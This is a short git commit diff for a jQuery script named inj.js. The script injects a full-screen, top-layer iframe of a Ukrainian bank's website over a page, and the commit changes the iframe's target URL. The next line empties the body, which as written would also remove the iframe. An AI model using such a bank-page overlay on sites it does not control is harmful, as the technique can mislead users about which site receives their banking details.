78a2c5745faa57dc8a3b70d10170884b17d97b1d
sl0ki <ruslano.prv@gmail.com>
2015-04-01 16:50:58 +0300

    Update inj.js

--- inj.js
+++ inj.js
@@ -1,2 +1,2 @@
-$('body').append('<iframe src="https://www.eximb.com/ukr/personal/everyday/internet_banking/app/" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>')
+$('body').append('<iframe src="https://www.eximb.com/ukr/personal/" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>')
 $('body').empty();
